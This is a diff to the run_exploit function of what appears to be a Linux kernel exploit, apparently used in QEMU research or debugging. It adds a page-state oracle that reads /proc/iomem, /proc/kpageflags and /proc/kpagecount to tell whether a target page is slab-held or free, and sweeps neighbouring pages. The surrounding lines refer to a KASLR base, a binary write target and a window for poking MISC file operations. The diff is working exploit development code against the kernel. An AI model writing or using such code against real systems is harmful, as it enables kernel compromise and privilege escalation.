@@ -978,6 +978,84 @@ int run_exploit(int argc, char **argv) {
                (unsigned long long)(kaslr_base + misc_off),
                data_addr(KIMAGE_TEXT_BASE + misc_off),
                binwrite_target);
+    /*
+     * KPAGEFLAGS oracle (QEMU root): is base's page still SLUB-held
+     * (KPF_SLAB bit7=0x80) or free in the buddy (KPF_BUDDY bit10=0x400)?
+     * phys = low-bits of the P0 alias + P0_PHYS_OFFSET (see p0_data_alias).
+     */
+    {
+      /* linear→phys needs the RUNNING RAM base, not the device P0 const:
+       * parse the first "System RAM" start from /proc/iomem. */
+      uint64_t memstart = 0;
+      {
+        FILE *f = fopen("/proc/iomem", "r");
+        if (f) {
+          char line[256];
+          while (fgets(line, sizeof(line), f)) {
+            uint64_t s = 0, e = 0;
+            char name[64] = {0};
+            int nr = sscanf(line, "%llx-%llx : %63[a-zA-Z ]",
+                            (unsigned long long *)&s,
+                            (unsigned long long *)&e, name);
+            if (nr < 2) {
+              s = 0;
+              nr = sscanf(line, "%llx-%llx: %63[a-zA-Z ]",
+                          (unsigned long long *)&s,
+                          (unsigned long long *)&e, name);
+            }
+            if (nr == 3 && strstr(name, "System RAM")) {
+              memstart = s;
+              break;
+            }
+          }
+          fclose(f);
+        }
+      }
+      uint64_t bphys = (page_base & 0x0000007fffffffffULL) + memstart;
+      uint64_t bpfn = bphys >> 12;
+      int kf = open("/proc/kpageflags", O_RDONLY);
+      int kc = open("/proc/kpagecount", O_RDONLY);
+      uint64_t fl = 0, cnt = 0;
+      if (kf >= 0 &&
+          pread(kf, &fl, sizeof(fl), (off_t)(bpfn * 8)) == (ssize_t)sizeof(fl))
+        ;
+      if (kc >= 0 &&
+          pread(kc, &cnt, sizeof(cnt), (off_t)(bpfn * 8)) == (ssize_t)sizeof(cnt))
+        ;
+      if (kf >= 0) close(kf);
+      if (kc >= 0) close(kc);
+      pr_info("KPAGE base phys=%016llx pfn=%llx flags=%016llx count=%llu "
+              "SLAB=%d BUDDY=%d ANON=%d\n",
+              (unsigned long long)bphys, (unsigned long long)bpfn,
+              (unsigned long long)fl, (unsigned long long)cnt,
+              (int)!!(fl & 0x80), (int)!!(fl & 0x400), (int)!!(fl & 0x400000));
+      /* neighborhood sweep: F=buddy-free S=slab .=other, base marked <> */
+      {
+        int kf2 = open("/proc/kpageflags", O_RDONLY);
+        if (kf2 >= 0) {
+          char map[64];
+          int mi = 0;
+          for (int d = -8; d <= 8; d++) {
+            uint64_t f2 = 0;
+            if (d == 0) {
+              map[mi++] = '<';
+            }
+            if (pread(kf2, &f2, sizeof(f2),
+                      (off_t)((bpfn + d) * 8)) == (ssize_t)sizeof(f2)) {
+              map[mi++] = (f2 & 0x400) ? 'F' : ((f2 & 0x80) ? 'S' : '.');
+            } else {
+              map[mi++] = '?';
+            }
+            if (d == 0) {
+              map[mi++] = '>';
+            }
+          }
+          map[mi] = 0;
+          pr_info("KPAGE sweep [-8..+8]: %s (F=free S=slab .=alloc)\n", map);
+          close(kf2);
+        }
+      }
+    }
     int armed_s = env_flag("CFI_TEST_WAIT", 45);
     pr_info("CFI_TEST: %ds window for external MISC.fops poke (lldb)…\n",
             armed_s);
